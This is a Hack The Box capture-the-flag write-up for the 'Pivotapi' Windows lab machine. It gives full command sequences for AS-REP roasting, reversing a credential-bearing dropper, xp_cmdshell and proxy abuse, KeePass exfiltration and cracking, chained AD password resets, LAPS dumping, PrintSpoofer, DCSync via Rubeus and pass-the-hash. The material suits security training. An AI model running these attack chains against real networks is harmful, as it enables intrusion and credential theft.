@@ -1,0 +1,587 @@
+pivotapi
+
+ 01st November 2021 / Document No D21.100.139
+ Prepared By: TheCyberGeek
+ Machine Author(s): CyberVaca & 3v4Si0N
+ Difficulty: Insane
+ Classification: Official
+Synopsis
+
+Pivotapi is an insane machine that involves user enumeration through the metadata of PDFs which are
+downloaded from a FTP file share server. Since the user has not got preauth with Kerberos it is possible to
+request a TGT for him which can be cracked with Hashcat. With the provided credentials an SMB
+enumeration exposes an executable which when reversed engineered reveals credentials to authenticate to
+MSSQL. After gaining access to the system it is possible to locate a keepass database on the target, leading
+to further misconfiguration abuse through Active Directory which leads obtaining the Administrator's
+password through LAPS and thus get execution on the target through psexec as user Administrator.
+
+Skills Required
+
+      Windows Enumeration
+      Active Directory Enumeration
+      Understanding of Kerberos
+      PowerShell Experience
+      MSSQL Knowledge
+      Understanding of Microsoft Authentication Mechanisms
+
+Skills Learned
+
+      Metadata Enumeration
+      Abusing Unset Preauth with Kerberos
+      Analyzing Executables Through Memory Dumps
+      DotNet Source Code Decompilation
+      Abusing MSSQL for Remote Code Execution
+      Extracting KeePass Database Passwords
+      Abusing Active Directory Misconfigurations
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 -Pn 10.10.10.240 | grep ^[0-9] | cut -d '/' -f1 |
+   tr '\n' ',' | sed s/,$//)
+   nmap -sC -sV -p$ports 10.10.10.240
+FTP Enumeration
+
+We start by downloading all the contents in the FTP server.
+   wget -m ftp://anonymous:x@10.10.10.240
+
+After investigating the contents of the FTP server, it's shown that there are multiple PDFs within the file
+share, although none of the PDFs contain any useful information so we check the exif data of the PDFs to
+see if it reveals any information about the owner of the PDFs.
+The exif data shows that the publisher is from LicorDeBellota.htb and that the user who created the PDF
+is named Kaorz . Using this information we can start to perform some enumeration of this user.
+
+Kerberos Preauth
+
+Since we know an existing user, we can check to see if Kerberos preauth is disabled on the system in which
+we can try to leverage to gain a TGT hash for the user by using the GetNPUsers.py from Impacket tool.
+
+   GetNPUsers.py LICORDEBELLOTA.HTB/Kaorz -dc-ip 10.10.10.240 -no-pass
+
+Saving the hash to file, we can use Hashcat to crack it.
+   hashcat -m 18200 k_tgt /usr/share/wordlists/rockyou.txt
+Now that we have retrieved credentials, we will try to authenticate to all possible services. We spot that we
+can indeed authenticate to the SMB server.
+
+   smbclient -L //10.10.10.240/ -U kaorz%Roper4155
+
+By exploring the NETLOGON share we discover some files that may be worth investigating.
+Downloading the files from the HelpDesk directory within the NETLOGON share we begin investigating what
+the Server MSSQL.msg and WinRM Service.msg files are and what they contain. After running strings
+on the files it is apparent that they are OLE2 based PDFs which are not readable, so using Zamar which is a
+msg to PDF converter , we are able to read the PDFs after conversion.
+
+The PDF contains a message to cybervaca indicating that since December 2020 the database has been
+changed from Oracle to MSSQL. Reading the WinRM Service.pdf reveals that the WinRM service has been
+disabled from being accessible publicly.
+Moving on to the RestartOracle-Service.exe file on a Windows host we start analysing what the
+executable can do. When running the executable though through the command line it seems like it does not
+run or it runs something hidden.
+
+Downloading the tool ProcMon64 from SysInternals and monitoring the process reveals that the executable
+indeed creates a temp file in C:\Users\Matt\AppData\Local\Temp .
+In order to capture the files, it is required to change the permissions of the Temp folder to disallow file
+deletions.
+
+Once the folder permissions have been applied we simply run again the Restart-OracleService.exe and
+check the temp folder.
+Inspecting the batch file that has been created two (2) files are being dropped by the batch file and being
+deleted before anyone can get access to the leftovers. A large base64 dump is converted into 2 files called
+oracle.txt and monta.ps1 then executes the month.ps1 file and deletes those files before executing
+restart-service.exe . We can review the code of the batch file:
+
+   @shift /0
+   @echo off
+
+   if %username% == matt goto correcto
+   if %username% == frankytech goto correcto
+   if %username% == ev4si0n goto correcto
+   goto error
+
+   :correcto
+   echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >
+   c:\programdata\oracle.txt
+   echo AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g >>
+   c:\programdata\oracle.txt
+   <SNIP>
+   echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >>
+   c:\programdata\oracle.txt
+
+   echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach
+   ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ","");
+   [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe",
+   [System.Convert]::FromBase64String($salida)) > c:\programdata\monta.ps1
+   powershell.exe -exec bypass -file c:\programdata\monta.ps1
+   del c:\programdata\monta.ps1
+   del c:\programdata\oracle.txt
+   c:\programdata\restart-service.exe
+   del c:\programdata\restart-service.exe
+
+By modifying the batch script and removing the deletion we can now retrieve the contents of the 2 files.
+   @shift /0
+   @echo off
+   echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >
+   c:\programdata\oracle.txt
+   echo AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g >>
+   c:\programdata\oracle.txt
+   <SNIP>
+   echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >>
+   c:\programdata\oracle.txt
+   echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach
+   ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ","");
+   [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe",
+   [System.Convert]::FromBase64String($salida)) > c:\programdata\monta.ps1
+
+After executing the batch script, after a few minutes we spot the oracle.txt which contains a file full of
+base64 lines, and a monta.ps1 script with the following contents.
+
+   $salida = $null;
+   $fichero = (Get-Content C:\ProgramData\oracle.txt) ;
+   foreach ($linea in $fichero) {$salida += $linea };
+   $salida = $salida.Replace(" ","");
+   [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe",
+   [System.Convert]::FromBase64String($salida))
+
+So this script simply reads the contents of the oracle.txt file we have and decodes it to the restart-
+service.exe executable. Running this script gives us a final executable that we can further analyze.
+
+Now when executing the restart-service.exe executable we are presented with a banned for Restart
+Oracle created by HelpDesk back in 2010.
+Inspecting the execution of the executable through ProcMon64 shows that the executable is querying
+multiple things in registry and does not show anything solid to go by.
+Stepping through the executable with x64dgb we hit the banner.
+
+Checking the memory maps at this stage shows an interesting new map added after the ASCII banner is
+being displayed.
+Exporting the newly discovered mapped item from memory to a dump file and running strings on it shows
+some interesting information.
+
+   C:\Users\Matt\Desktop\SysInternals\strings64.exe restart-service_00000000007F0000.bin
+
+We have discovered a password #oracle_s3rV1c3!2010 but knowing the dump contains a .NET
+executable, we can use De4Dot so we can reverse .NET executables back to source code by dragging the
+restart-service_00000000007F0000.bin onto the de4dot executable.
+
+Now using DnSpy we can read the source code of the application.
+With the source code disclosed we can understand that this binary is a custom made runas.exe with a sole
+purpose of restarting the Oracle service with a hardcoded password from 2010 using the svc_oracle
+username. Checking with crackmapexec we can check if the credentials are valid against the target.
+
+   crackmapexec smb licordebellota.htb -u svc_oracle -p '#oracle_s3rV1c3!2010'
+
+Referring back to the MSSQL PDF we can make a logical assumption that the password will be the
+#mssql_s3rV1c3!2020 after the migration to MSSQL service which possibly could authenticate to the
+MSSQL service using user svc_mssql .
+
+   crackmapexec smb licordebellota.htb -u svc_mssql -p '#mssql_s3rV1c3!2020'
+We have a successful hit on the updated service account username and password. Testing if we can
+authenticate to the MSSQL service as svc_mssql shows unfortunately that we can't.
+
+   crackmapexec mssql licordebellota.htb -u svc_mssql -p '#mssql_s3rV1c3!2020'
+
+The translation is user login error 'LICORDEBELLOTA\svc_mssql' . So we try common accounts such as
+sa to check if they perhaps assigned to super user the password when constructing the database.
+
+   crackmapexec mssql licordebellota.htb -u sa -p '#mssql_s3rV1c3!2020'
+This time we get a different response which translated to Login error. Login is from an untrusted
+domain and cannot be used with Integrated Authentication . Now that we know we can authenticate
+as user sa to the MSSQL service we can try to authenticate to the server. Using sqlcmd we can access the
+MSSQL instance and begin enumerating.
+
+   sqlcmd -S licordebellota.htb -U sa -P '#mssql_s3rV1c3!2020'
+
+Since we know we are using the sa user and the user is a sysadmin, we know we can enable XP_CMDSHELL .
+There are 2 methods we can use to get onto the system.
+
+Method 1: Get credentials.kdbx
+
+Since we know that we can gain command execution through MSSQL, we can utilise a new MSSQL proxy
+tool which will allow us to load a DLL into the MSSQL server and utilise it at a proxy connection so we can
+access internal ports. First we clone the project from the link and navigate into that directory. Then we
+download the release files for assembly.dll and reciclador.dll.
+
+   mv assembly.dll Microsoft.SqlServer.Proxy.dll
+   export username='sa'
+   export password='#mssql_s3rV1c3!2020'
+   export ip_mssql='10.10.10.240'
+   python2.7 mssqlclient.py $username:$password@$ip_mssql
+   enable_xp_cmdshell
+   enable_ole
+   upload reciclador.dll c:\windows\temp\reciclador.dll
+We use the mssqlclient.py from the Impacket framework so we can connect to MSSQL:
+   python2.7 mssqlclient.py $username:$password@$ip_mssql
+Once the reciclador.dll file has been uploaded, next we just need to enable the
+Microsoft.SqlServer.Proxy.dll by issuing the following command:
+
+   python2.7 mssqlclient.py $username:$password@$ip_mssql -install -clr
+   Microsoft.SqlServer.Proxy.dll
+
+Now we check if reciclador.dll is loaded on the target.
+   python2.7 mssqlclient.py $username:$password@$ip_mssql -check -reciclador
+   'c:\windows\temp\reciclador.dll'
+And finally we start the proxy server.
+   python2.7 mssqlclient.py $username:$password@$ip_mssql -start -reciclador
+   'c:\windows\temp\reciclador.dll'
+
+With the proxy server listening we need to change the proxychains configuration file proxychains.conf to
+listen on the port allocated by the proxy server which is 1337 in this case and set it to SOCKS5 .
+   [ProxyList]
+   socks5 127.0.0.1 1337
+Now it is possible to test connectivity to WinRM by using nmap to scan the port and check if it's open.
+   proxychains4 nmap -sT -Pn -p5985 10.10.10.240
+
+Now that we are sure we can connect to the target, we check if there is a case of password reuse against the
+svc_mssql account.
+
+   proxychains4 evil-winrm -i 10.10.10.240 -u svc_mssql -p '#mssql_s3rV1c3!2020'
+
+From here we can use the Evil-WinRM functionality to download files from the target.
+Method 2: Get credentials.kdbx
+
+For the second option we can leverage Alamot's mssql_shell.py. After downloading the mssql_shell.py we
+need to make minor adjustments to the script due to Python3 compatibility, so we set the host, username,
+password and change base64.encodestring to base64.b64encode .
+
+   MSSQL_SERVER="10.10.10.240"
+   MSSQL_USERNAME = "sa"
+   MSSQL_PASSWORD = "#mssql_s3rV1c3!2020"
+   BUFFER_SIZE = 5*1024
+   TIMEOUT = 30
+   <SNIP>
+   def upload(mssql, stored_cwd, local_path, remote_path):
+
+          print("Uploading "+local_path+" to "+remote_path)
+          cmd = 'type nul > "' + remote_path + '.b64"'
+          mssql.execute_query("EXEC xp_cmdshell '"+cmd+"'")
+
+          with open(local_path, 'rb') as f:
+                 data = f.read()
+                 md5sum = hashlib.md5(data).hexdigest()
+                 b64enc_data = b"".join(base64.b64encode(data).split()).decode() # Change here
+
+After saving the changes we execute the script and get access to the host.
+
+   python3 mssql_shell.py
+When first getting access to the system we quickly realise that we cannot navigate to any of the users
+directories since we are the MSSQL service account . We can though utilise powershell and we know
+from previously that svc_mssql account can authenticate to the SMB, so we can check if it is possible to
+execute commands as svc_mssql .
+
+   powershell -c "$pass = convertto-securestring '#mssql_s3rV1c3!2020' -asplaintext -
+   force;$cred = new-object
+   system.management.automation.pscredential('licordebellota\svc_mssql', $pass);invoke-
+   command -computername 127.0.0.1 -credential $cred -scriptblock {whoami}"
+
+Since we know now that we can execute commands as svc_mssql we check the desktop of the user and
+find some interesting files.
+
+   powershell -c "$pass = convertto-securestring '#mssql_s3rV1c3!2020' -asplaintext -
+   force;$cred = new-object
+   system.management.automation.pscredential('licordebellota\svc_mssql', $pass);invoke-
+   command -computername 127.0.0.1 -credential $cred -scriptblock {dir
+   c:\users\svc_mssql\desktop}"
+Further reading the note reveals the password usage through SSH service.
+   powershell -c "$pass = convertto-securestring '#mssql_s3rV1c3!2020' -asplaintext -
+   force;$cred = new-object
+   system.management.automation.pscredential('licordebellota\svc_mssql', $pass);invoke-
+   command -computername 127.0.0.1 -credential $cred -scriptblock {type
+   c:\users\svc_mssql\desktop\note.txt}"
+
+Then we convert the credentials.kdbx to base64 so we can bring it back to our localhost for further
+analysis with the following command.
+
+   powershell -c "$pass = convertto-securestring '#mssql_s3rV1c3!2020' -asplaintext -
+   force;$cred = new-object
+   system.management.automation.pscredential('licordebellota\svc_mssql', $pass);invoke-
+   command -computername 127.0.0.1 -credential $cred -scriptblock {certutil -encode
+   C:\users\svc_mssql\desktop\credentials.kdbx C:\temp\credentials.out}"
+CertUtil successfully converted the credentials file to base64 and now we can view the contents.
+On our locahost we can echo the contents of the certificate and pipe it to base64 to decode back to the
+credentials.kdbx file:
+
+   echo "A9mi<SNIP>JJ6" | base64 -d > credentials.kdbx
+
+Accessing KeePass Credentials
+
+It is possible to check what the file is with the file command and confirm that it's a KeePass database.
+   file credentials.kdbx
+
+We can crack the KeePass password by converting the database to a hash file to be able to access it.
+   keepass2john credentials.kdbx > hash
+   john -w=/usr/share/wordlists/rockyou.txt hash
+Using the credentials we can now access the KeePass database using keepass2 binary which can be
+downloaded from here.
+
+Once authenticated we can find a SSH password for 3v4si0n so we right click on the password and copy
+the password of Gu4nCh3C4NaRi0N!23 , then attempt to authenticate to SSH with these credentials.
+
+   ssh 3v4Si0N@10.10.10.240
+Finally foothold was achieved and now it is possible to read the user flag.
+
+Privilege Escalation
+
+To begin enumeration we upload SharpHound.exe via scp to the target.
+   scp ./SharpHound.exe 3v4Si0N@10.10.10.240:/temp
+
+Once we execute SharpHound.exe we observe that a zip file is created. We import it into BloodHound .
+We get the dump on our localhost and now we can import it into bloodhound and inspect the current GPOs
+of the users. After enumerating some of them, we discover that 3v4Si0N has generic all over Dr. Zaiuss .
+
+With this knowledge we have full control over Dr.Zaiuss user, so we can upload PowerView.ps1 and after
+bypassing ASMI we can reset Dr.Zaiuss's password.
+
+   scp PowerView.ps1 3v4si0n@10.10.10.240:/temp
+Then it is possible to change the user's password by issuing the following commands.
+   powershell -ep bypass
+   Import-Module .\PowerView.ps1
+   $SecurePassword = ConvertTo-SecureString 'Gu4nCh3C4NaRi0N!23' -AsPlaintext -Force
+   $Creds = New-Object System.Management.Automation.PSCredential('licordebelotta\3v4Si0N',
+   $SecurePassword)
+   $UserPass = ConvertTo-SecureString 'Password123!' -AsPlaintext -Force
+   Set-DomainUserPassword -Identity dr.zaiuss -AccountPassword $UserPass -Credential
+   $Creds
+
+Now we can enter into a PSSession as Dr. Zaiuss by issuing the following:
+
+   $pass = convertto-securestring -AsPlainText -Force "Password123!"
+   $cred = New-Object
+   System.Management.Automation.PSCredential("LicorDeBellota\dr.zaiuss", $pass)
+   $session = new-pssession -computername 127.0.0.1 -Credential $cred
+   Enter-PSSession -session $session
+
+Checking BloodHound we can observe that Dr.Zaiuss has also Generic-All over SuperFume.
+
+That means we can perform the previous steps to takeover the SuperFume user account.
+
+   cd C:\temp
+   powershell -ep bypass
+   Import-Module .\PowerView.ps1
+   $SecurePassword = ConvertTo-SecureString 'Password123!' -AsPlaintext -Force
+   $Creds = New-Object
+   System.Management.Automation.PSCredential('licordebelotta\dr.zaiuss', $SecurePassword)
+   $UserPass = ConvertTo-SecureString 'Password123!' -AsPlaintext -Force
+   Set-DomainUserPassword -Identity superfume -AccountPassword $UserPass -Credential
+   $Creds
+
+After we exit our current PSSession, we can get a session as SuperFume user.
+
+   exit
+   $pass = convertto-securestring -AsPlainText -Force "Password123!"
+   $cred = New-Object
+   System.Management.Automation.PSCredential("LicorDeBellota\superfume", $pass)
+   $session = new-pssession -computername 127.0.0.1 -Credential $cred
+   Enter-PSSession -session $session
+
+Checking the groups of the current user shows that user belongs in the Developers group.
+   net user superfume
+Further enumerating the file system reveals a Developers folder.
+Enumerating the Jari folder exposes 2 files.
+We review the source code of the program.cs
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Diagnostics;
+using System.Threading;
+
+namespace restart_oracle
+{
+
+       class Program
+       {
+
+              public class RC4
+              {
+
+                     public static byte[] Encrypt(byte[] pwd, byte[] data)
+                     {
+
+                             int a, i, j, k, tmp;
+                             int[] key, box;
+                             byte[] cipher;
+
+                             key = new int[256];
+                             box = new int[256];
+                             cipher = new byte[data.Length];
+
+                             for (i = 0; i < 256; i++)
+                             {
+
+                                    key[i] = pwd[i % pwd.Length];
+                                    box[i] = i;
+                             }
+                             for (j = i = 0; i < 256; i++)
+                             {
+                                    j = (j + box[i] + key[i]) % 256;
+                                    tmp = box[i];
+                                    box[i] = box[j];
+                                    box[j] = tmp;
+                             }
+                             for (a = j = i = 0; i < data.Length; i++)
+                             {
+                                    a++;
+                                    a %= 256;
+                                    j += box[a];
+                                    j %= 256;
+                                    tmp = box[a];
+                                    box[a] = box[j];
+                                    box[j] = tmp;
+                                    k = box[((box[a] + box[j]) % 256)];
+                                    cipher[i] = (byte)(data[i] ^ k);
+                             }
+                return cipher;
+         }
+
+         public static byte[] Decrypt(byte[] pwd, byte[] data)
+         {
+
+                return Encrypt(pwd, data);
+         }
+
+         public static byte[] StringToByteArray(String hex)
+         {
+
+                int NumberChars = hex.Length;
+                byte[] bytes = new byte[NumberChars / 2];
+                for (int i = 0; i < NumberChars; i += 2)
+
+                       bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
+                return bytes;
+         }
+
+      }
+
+      static void Main()
+      {
+
+         string banner = @"
+
+____     __                     __                                __
+
+/ __ \___ _____/ /_____ ______/ /_ ____ ___ ______________ _/ /
+
+/ /_/ / _ \/ ___/ __/ __ `/ ___/ __/ / __ `__ \/ ___/ ___/ __ `/ /
+
+/ _, _/ __(__ ) /_/ /_/ / / / /_ / / / / / (__ |__ ) /_/ / /
+
+/_/ |_|\___/____/\__/\__,_/_/ \__/ /_/ /_/ /_/____/____/\__, /_/
+
+                                    /_/
+
+                                    by @HelpDesk 2020
+
+";
+                     byte[] key = Encoding.ASCII.GetBytes("");
+                     byte[] password_cipher = { };
+                     byte[] resultado = RC4.Decrypt(key, password_cipher);
+                     Console.WriteLine(banner);
+                     Thread.Sleep(5000);
+                     System.Diagnostics.Process psi = new System.Diagnostics.Process();
+                     System.Security.SecureString ssPwd = new System.Security.SecureString();
+                     psi.StartInfo.FileName = "c:\\windows\\syswow64\\cmd.exe";
+                     psi.StartInfo.Arguments = "/c sc.exe stop SERVICENAME ; sc.exe start
+
+SERVICENAME";
+                     psi.StartInfo.RedirectStandardOutput = true;
+                     psi.StartInfo.UseShellExecute = false;
+                     psi.StartInfo.UserName = "Jari";
+                     string password = "";
+                     for (int x = 0; x < password.Length; x++)
+                     {
+                           ssPwd.AppendChar(password[x]);
+                         }
+                         password = "";
+                         psi.StartInfo.Password = ssPwd;
+                         psi.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                         psi.Start();
+                 }
+          }
+   }
+Checking the file type of restart-service.exe shows that it's another PE using .Net framework, which
+we can perform the previous steps to reverse it with De4Dot and DnSpy .
+   file restart-mssql.exe
+
+After transferring the executable restart-service.exe to a local Windows machine, we repeat the
+process of dragging the restart-service.exe over dnspy.exe that allows it to convert the executable to
+decompilable format.
+Opening it in DnSpy reveals the source code of the executable.
+Since DnSpy allows us to edit code and recompile the solution is quite simple. We can print the password
+before it's encrypted and passed on to authenticate Jari user.
+
+After recompiling the executable and running it we are shown the plaintext password.
+
+Going back to our existing PSSession we now exit it and create a new session to access Jari account.
+   exit
+   $pass = convertto-securestring -AsPlainText -Force "Cos@Chung@!RPG"
+   $cred = New-Object System.Management.Automation.PSCredential("LicorDeBellota\jari",
+   $pass)
+   $session = new-pssession -computername 127.0.0.1 -Credential $cred
+   Enter-PSSession -session $session
+Checking BloodHound we identify that Jari has ForcePasswordChange rights of Gibdeon .
+
+Again we can change the password of Gibdeon as Jari by issuing the following.
+   cd c:\temp
+   powershell -ep bypass
+   Import-Module .\PowerView.ps1
+   $SecurePassword = ConvertTo-SecureString 'Cos@Chung@!RPG' -AsPlaintext -Force
+   $Creds = New-Object System.Management.Automation.PSCredential('licordebelotta\jari',
+   $SecurePassword)
+   $UserPass = ConvertTo-SecureString 'Password123!' -AsPlaintext -Force
+   Set-DomainUserPassword -Identity gibdeon -AccountPassword $UserPass -Credential $Creds
+
+Repeating the process as before, we exit the current PSSession and drop into a new session as Gibdeon .
+   $pass = convertto-securestring -AsPlainText -Force "Password123!"
+   $cred = New-Object System.Management.Automation.PSCredential("LicorDeBellota\gibdeon",
+   $pass)
+   Add-Adgroupmember -Identity 'laps adm' -Members gibdeon -Credential $cred
+   Add-Adgroupmember -Identity 'laps read' -Members gibdeon -Credential $cred
+
+Now that Gibdeon is in the laps adm and laps read groups, we can leverage this to read the
+administrator's password from the LAPS service using LAPS dumper.
+
+   python laps.py -u gibdeon -p "Password123!" -d licordebellota.htb -l
+   pivotapi.licordebellota.htb
+
+Finally we have the administrator password and it is possible to use PSEXEC to gain access to the target.
+   psexec.py administrador@10.10.10.240
+We can get the root flag now from Administrator's desktop.
+
+Unintended - PrintSpoofer
+
+One of the unintended solutions to the machine was abusing SEImpersonatePrivilege via PrintSpoofer.
+Using Alamot's MSSQL shell, we can take advantage of the upload functionality and transfer
+PrintSpoofer64.exe to the target.
+
+   UPLOAD PrintSpoofer64.exe C:\temp\PrintSpoofer64.exe
+Testing functionlaity of the PrintSpoofer64.exe executable we can see that we are authenticated as the
+machine account which we can leverage to read the flags and dump the system hashes to gain access as
+administrador with mimikatz .
+
+   PrintSpoofer64.exe -i -c "powershell -c whoami"
+
+Unintended 2 - DCSync
+
+It is also possible to utilise a DCSync attack in which we forge a TGT ticket with the MSSQL service account,
+extract the system hashes with Impacket's secretsdump.py utility and utilise it with PSEXEC to exploit the
+machine.
+
+   C:\temp> UPLOAD Rubeus.exe C:\temp\Rubeus.exe
+Using Rubeus.exe we specify to delete TGT which will create a base64 ticket abusing the machine account.
+   .\Rubeus.exe tgtdeleg
+
+We save the base64 ticket to a file and thewe decode it and convert it to kirbi forman t.
+   cat ticket | base64 -d > ticket.kirbi
+   ticketConverter.py ticket.kirbi ticket.ccache
+
+To utlise this new ticket we export as follows:
+   export KRB5CCNAME=/home/thecybergeek/htb/pivotapi/ticket.ccache
+Using the exported ticket we can utilise secrets dump to gain the NTLM hashes of the system.
+
+   secretsdump.py LICORDEBELLOTA.HTB/pivotapi\$@pivotapi.licordebellota.htb -dc-ip
+     10.10.10.240 -no-pass -k
+
+With the newly obtained NTLM hash we simply execute PSEXEC to spawn a shell as user administrador .
+   psexec.py LICORDEBELLOTA.HTB/Administrador@10.129.143.192 -hashes
+   0ade2f42ee2ed2dffe8d675885877a78:0ade2f42ee2ed2dffe8d675885877a78
+
